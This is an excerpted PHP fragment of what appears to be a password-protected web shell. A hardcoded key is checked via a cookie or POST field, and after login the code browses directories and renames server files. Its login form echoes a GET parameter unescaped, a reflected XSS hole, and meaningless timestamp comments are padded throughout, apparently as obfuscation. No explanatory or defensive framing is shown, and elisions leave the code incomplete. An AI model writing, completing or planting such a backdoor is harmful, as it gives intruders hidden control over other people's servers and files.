...
$auth_key = "5fdbe16359c7ca0b3f4294abb7bfcdb1";
...
$pass = false;
if (isset($_COOKIE['pw_name_50522'])) {
    if(($_COOKIE['pw_name_50522']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_50522'])) {
        if(($_POST['pw_name_50522']) == $auth_key) {
            setcookie("pw_name_50522", $_POST['pw_name_50522']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_50522' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724568776505832 1724568776309322 1724568776458893 1724568776952354
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724568776505832 1724568776309322 1724568776458893 1724568776952354
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724568776505832 1724568776309322 1724568776458893 1724568776952354
            $name = PATH . "/" . $_GET['r'];
